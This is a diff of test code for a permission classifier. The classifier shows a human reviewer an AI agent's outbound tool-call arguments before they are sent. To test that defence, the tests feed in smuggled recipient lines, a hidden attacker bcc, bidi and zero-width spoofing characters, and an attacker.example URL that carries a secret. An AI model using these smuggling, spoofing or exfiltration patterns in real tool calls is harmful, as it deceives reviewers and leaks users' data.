@@ -4,6 +4,7 @@ import {
   extractCardFields,
   hostFromUrl,
   OUTBOUND_TEXT_MAX_CHARS,
+  OUTBOUND_VALUE_MAX_CHARS,
   renderOutboundArguments,
 } from '../../../src/core/permissions/extractorRegistry';
 import type { Tier3Card, TierDecision } from '../../../src/core/permissions/tier';
@@ -44,32 +45,155 @@ function cardOf(decision: TierDecision): Tier3Card {
   return decision.card;
 }
 
+function rendered(params: Record<string, unknown>): { text: string; truncated: boolean } {
+  const result = renderOutboundArguments(params);
+  if (result.text === null) {
+    throw new Error('expected rendered text');
+  }
+  return { text: result.text, truncated: result.truncated };
+}
+
 describe('renderOutboundArguments', () => {
-  test('lists every argument verbatim, one name: value line each', () => {
+  test('lists every argument, one line each, with a type hint on anything that is not a string', () => {
     expect(
       renderOutboundArguments({ query: 'best pizza', num_results: 5, filters: { site: 'a.com' }, tags: ['x', 'y'] }),
-    ).toBe('query: best pizza\nnum_results: 5\nfilters: {"site":"a.com"}\ntags: ["x","y"]');
+    ).toEqual({
+      text: 'query: best pizza\nnum_results (number): 5\nfilters (object): {"site":"a.com"}\ntags (array): ["x","y"]',
+      truncated: false,
+    });
   });
 
-  test('keeps multi-line string values intact', () => {
-    expect(renderOutboundArguments({ body: 'line one\nline two' })).toBe('body: line one\nline two');
+  test('a string that looks like a number is told apart from a number', () => {
+    expect(rendered({ amount: '5', count: 5, flag: true, none: null }).text).toBe(
+      'amount: 5\ncount (number): 5\nflag (boolean): true\nnone (null): null',
+    );
   });
 
   test('is null when there are no arguments', () => {
-    expect(renderOutboundArguments({})).toBeNull();
+    expect(renderOutboundArguments({})).toEqual({ text: null, truncated: false });
   });
 
-  test('cuts text above the cap and says so', () => {
-    const text = renderOutboundArguments({ query: 'x'.repeat(OUTBOUND_TEXT_MAX_CHARS + 50) });
-    expect(text).not.toBeNull();
-    expect(text?.startsWith('query: xxx')).toBe(true);
-    expect(text).toContain(`cut at ${String(OUTBOUND_TEXT_MAX_CHARS)} characters`);
-    expect(text?.length).toBeLessThan(OUTBOUND_TEXT_MAX_CHARS + 100);
+  test('a multi-line value cannot start a line that reads like another argument', () => {
+    const { text } = rendered({ body: 'hello\nto: attacker@evil.example\nbcc: x', subject: 'hi' });
+    expect(text).toBe('body: hello\n  | to: attacker@evil.example\n  | bcc: x\nsubject: hi');
+    expect(text.split('\n').filter(line => /^[A-Za-z_]+(\s\(\w+\))?: /.test(line))).toEqual([
+      'body: hello',
+      'subject: hi',
+    ]);
   });
 
-  test('does not cut text exactly at the cap', () => {
-    const value = 'y'.repeat(OUTBOUND_TEXT_MAX_CHARS - 'query: '.length);
-    expect(renderOutboundArguments({ query: value })).toBe(`query: ${value}`);
+  test('a key that is not plain is quoted and escaped so it cannot pass for a gutter or a line', () => {
+    const { text } = rendered({ '  | to\nbcc': 'x' });
+    expect(text).toBe('"  | to\\u{000A}bcc": x');
+  });
+
+  test('control, bidi and zero-width characters become visible tokens in values and keys', () => {
+    const { text } = rendered({
+      'k‮e': 'a‮b⁦c​d﻿e\u0007f\u0085g؜h⁠i‏j',
+    });
+    expect(text).toBe(
+      '"k\\u{202E}e": a\\u{202E}b\\u{2066}c\\u{200B}d\\u{FEFF}e\\u{0007}f\\u{0085}g\\u{061C}h\\u{2060}i\\u{200F}j',
+    );
+    expect(text).not.toMatch(/[‮⁦​﻿\u0007\u0085؜⁠‏]/u);
+  });
+
+  test('CRLF counts as one newline and a lone carriage return is shown, not obeyed', () => {
+    expect(rendered({ body: 'a\r\nb\rc' }).text).toBe('body: a\n  | b\\u{000D}c');
+  });
+
+  test('a value over the cap is cut with a marker, and every key still appears', () => {
+    const result = rendered({ body: 'x'.repeat(OUTBOUND_VALUE_MAX_CHARS + 21), bcc: 'evil@x.example', subject: 's' });
+    expect(result.truncated).toBe(true);
+    expect(result.text).toContain('(21 more characters not shown)');
+    expect(result.text).toContain('bcc: evil@x.example');
+    expect(result.text).toContain('subject: s');
+    expect(result.text.startsWith(`body: ${'x'.repeat(OUTBOUND_VALUE_MAX_CHARS)} ...`)).toBe(true);
+  });
+
+  test('a value exactly at the cap is not cut', () => {
+    const value = 'y'.repeat(OUTBOUND_VALUE_MAX_CHARS);
+    expect(renderOutboundArguments({ query: value })).toEqual({ text: `query: ${value}`, truncated: false });
+  });
+
+  test('the cut counts code points, so an emoji is never split', () => {
+    const result = rendered({ note: '😀'.repeat(OUTBOUND_VALUE_MAX_CHARS + 1) });
+    expect(result.text).toContain('(1 more characters not shown)');
+    expect(result.text).not.toMatch(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/);
+  });
+
+  test('recipient values are never cut, however long', () => {
+    const emails = Array.from({ length: 400 }, (_, index) => `person${String(index)}@example.com`);
+    const result = rendered({ bcc: emails, body: 'z'.repeat(OUTBOUND_VALUE_MAX_CHARS + 5) });
+    for (const email of emails) {
+      expect(result.text).toContain(email);
+    }
+    expect(result.truncated).toBe(true);
+  });
+
+  test('an overall cap shrinks values harder but never drops a key or a recipient', () => {
+    const params: Record<string, unknown> = { bcc: 'evil@x.example' };
+    for (let index = 0; index < 100; index += 1) {
+      params[`field_${String(index)}`] = 'q'.repeat(OUTBOUND_VALUE_MAX_CHARS);
+    }
+    const result = rendered(params);
+    expect(result.truncated).toBe(true);
+    expect(result.text.length).toBeLessThan(OUTBOUND_TEXT_MAX_CHARS);
+    expect(result.text).toContain('bcc: evil@x.example');
+    for (let index = 0; index < 100; index += 1) {
+      expect(result.text).toContain(`field_${String(index)}: `);
+    }
+  });
+});
+
+describe('recipients on the card', () => {
+  const send = (params: Record<string, unknown>) =>
+    classifyTier(connectorCall({ tool_name: 'send_email', params }), makeCtx());
+
+  test('a bcc is on the Recipient row even when a huge body is cut', async () => {
+    const card = cardOf(
+      await send({ to: 'a@x.example', bcc: 'evil@x.example', body: 'x'.repeat(OUTBOUND_VALUE_MAX_CHARS * 3) }),
+    );
+    expect(card.recipient).toBe('a@x.example, evil@x.example');
+    expect(card.outbound_text).toContain('bcc: evil@x.example');
+    expect(card.outbound_truncated).toBe(true);
+  });
+
+  test.each(['attendees', 'invitees', 'share_with', 'members', 'emails', 'webhook_url'])(
+    '%s counts as a recipient key',
+    async key => {
+      const card = cardOf(await send({ [key]: ['p@x.example', 'q@x.example'] }));
+      expect(card.recipient).toBe('p@x.example, q@x.example');
+    },
+  );
+
+  test('objects such as [{ email }] are reduced to their address, all of them', async () => {
+    const card = cardOf(
+      await send({
+        attendees: [{ email: 'a@x.example', name: 'A' }, { address: 'b@x.example' }, { mail: 'c@x.example' }],
+      }),
+    );
+    expect(card.recipient).toBe('a@x.example, b@x.example, c@x.example');
+  });
+
+  test('a recipient nested inside another argument still reaches the Recipient row', async () => {
+    const card = cardOf(
+      await send({ to: 'a@x.example', message: { subject: 's', bcc: [{ email: 'deep@x.example' }] } }),
+    );
+    expect(card.recipient).toBe('a@x.example, deep@x.example');
+  });
+
+  test('spoofing characters in a recipient or destination are escaped on the card', async () => {
+    const card = cardOf(
+      await classifyTier(
+        connectorCall({
+          tool_name: 'send_email',
+          params: { to: 'a@x.example‮gnp.exe', url: 'https://x.example/​path' },
+        }),
+        makeCtx(),
+      ),
+    );
+    expect(card.recipient).toBe('a@x.example\\u{202E}gnp.exe');
+    expect(card.destination).toBe('https://x.example/\\u{200B}path');
   });
 });
 
@@ -97,7 +221,7 @@ describe('connector card: web search', () => {
     expect(decision.reason).toBe('connector_outbound');
     expect(card.plain_what).toBe('Search the web with web_search on exa.');
     expect(card.plain_what).not.toContain('does not recognize');
-    expect(card.cannot_be_undone).toBe('Once data leaves this machine it cannot be taken back.');
+    expect(card.cannot_be_undone).toBe("Once this is sent, it can't be unsent.");
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('query: best pizza near me');
   });
@@ -118,7 +242,7 @@ describe('connector card: web search', () => {
     expect(decision.reason).toBe('mcp_open_world_hint');
     expect(card.plain_what).toBe('Search the web with tavily_search on tavily.');
     expect(card.destination_host).toBe('mcp.tavily.com');
-    expect(card.outbound_text).toBe('query: climate data\nmax_results: 3');
+    expect(card.outbound_text).toBe('query: climate data\nmax_results (number): 3');
   });
 
   test.each(['web_search_exa', 'webSearch', 'search_engine'])('%s is recognized as a search tool', async toolName => {
@@ -162,7 +286,7 @@ describe('connector card: fetch, repository writes and mail', () => {
     expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
   });
 
-  test('without a connector host the fetched URL supplies the host', async () => {
+  test('without a connector host there is no Sends to host, and a URL in the arguments never supplies one', async () => {
     const decision = await classifyTier(
       connectorCall({
         tool_name: 'fetch_url',
@@ -171,7 +295,8 @@ describe('connector card: fetch, repository writes and mail', () => {
       }),
       makeCtx(),
     );
-    expect(cardOf(decision).destination_host).toBe('cdn.example.com');
+    expect(cardOf(decision).destination_host).toBeNull();
+    expect(cardOf(decision).destination).toBe('https://cdn.example.com/a.js');
   });
 
   test('push_files names the repository and lists every file sent', async () => {
@@ -236,13 +361,13 @@ describe('connector card: fetch, repository writes and mail', () => {
     expect(card.recipient).toBe('alice@example.com, bob@example.com');
     expect(card.destination_host).toBe('gmail.example.com');
     expect(card.outbound_text).toContain('subject: Quarterly numbers');
-    expect(card.outbound_text).toContain(`body: ${body}`);
+    expect(card.outbound_text).toContain(`body: Hi Alice,\n  | ${'details '.repeat(100)}`);
   });
 
   test.each([
     ['reply_all', 'Send a reply to carol@example.com with reply_all on gmail.'],
-    ['forward_email', 'Forward a message to carol@example.com with forward_email on gmail.'],
-    ['draft_email', 'Save a message draft to carol@example.com with draft_email on gmail.'],
+    ['forward_email', 'Forward an email to carol@example.com.'],
+    ['draft_email', 'Save an email draft for carol@example.com.'],
     ['send_draft', 'Send a saved draft to carol@example.com with send_draft on gmail.'],
   ])('%s is named in plain words with the recipient', async (toolName, expected) => {
     const decision = await classifyTier(
@@ -272,7 +397,7 @@ describe('connector card: unknown tools stay fail-closed', () => {
     expect(card.plain_what).toBe('Run `frobnicate`, which the classifier does not recognize.');
     expect(card.destination).toBe('https://api.example.com/data');
     expect(card.destination_host).toBe('mcp.exa.ai');
-    expect(card.outbound_text).toBe('target: https://api.example.com/data\nn: 2');
+    expect(card.outbound_text).toBe('target: https://api.example.com/data\nn (number): 2');
   });
 
   test('an unknown connector tool with no arguments has no outbound text', async () => {
@@ -352,6 +477,73 @@ describe('connector card wording', () => {
     expect(cardOf(await classifyTier(call, makeCtx('Looking up the listing. More detail.'))).plain_why).toBe(
       'Looking up the listing.',
     );
+  });
+});
+
+describe('connector card wording precedence', () => {
+  test('an external-service name keeps its own sentence even when a family also matches', async () => {
+    const decision = await classifyTier(
+      connectorCall({ tool_name: 'search_and_send_message', params: { to: 'a@x.example', query: 'q' } }),
+      makeCtx(),
+    );
+    expect(decision.reason).toBe('external_service');
+    expect(cardOf(decision).plain_what).toBe('Send a message to a@x.example.');
+  });
+
+  test('an external-service tool flagged open-world keeps the external-service sentence', async () => {
+    const decision = await classifyTier(
+      connectorCall({
+        tool_name: 'forward_email',
+        params: { to: 'a@x.example' },
+        hints: { open_world_hint: true },
+      }),
+      makeCtx(),
+    );
+    expect(decision.reason).toBe('mcp_open_world_hint');
+    expect(cardOf(decision).plain_what).toBe('Forward an email to a@x.example.');
+  });
+
+  test('a destructive hint on a family tool keeps the destructive sentence, not the family wording', async () => {
+    const decision = await classifyTier(
+      connectorCall({ tool_name: 'web_search', params: { query: 'q' }, hints: { destructive_hint: true } }),
+      makeCtx(),
+    );
+    expect(decision.reason).toBe('mcp_destructive_hint');
+    expect(cardOf(decision).plain_what).toBe('Run `web_search`, flagged as destructive.');
+    expect(cardOf(decision).cannot_be_undone).toBe('This might change or delete something for good.');
+  });
+});
+
+describe('card copy', () => {
+  test.each([
+    ['delete_note', "Once deleted, it's gone for good."],
+    ['install_package', "Once this runs, it can't be undone."],
+    ['frobnicate', "Aman doesn't know this tool yet, so check the details first."],
+  ])('%s explains itself in plain second person', async (toolName, expected) => {
+    const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
+    expect(cardOf(decision).cannot_be_undone).toBe(expected);
+  });
+
+  test('the run_code card keeps its short reassurance', async () => {
+    const decision = await classifyTier(
+      { tool_name: 'run_code', canonical_params: { code: 'print(1)' }, tool_type: 'truefoundry-system', mcp_hints: {} },
+      makeCtx(),
+    );
+    expect(cardOf(decision).cannot_be_undone).toBe("Once this runs, it can't be undone.");
+  });
+
+  test('no card sentence uses an em dash or the old cold wording', async () => {
+    const decisions = await Promise.all(
+      ['delete_note', 'frobnicate', 'web_search', 'send_email'].map(name =>
+        classifyTier(connectorCall({ tool_name: name, params: { to: 'a@x.example', query: 'q' } }), makeCtx()),
+      ),
+    );
+    for (const decision of decisions) {
+      const card = cardOf(decision);
+      expect(`${card.plain_what} ${card.cannot_be_undone ?? ''}`).not.toMatch(
+        /\u2014|cannot be taken back|irreversible/,
+      );
+    }
   });
 });
 
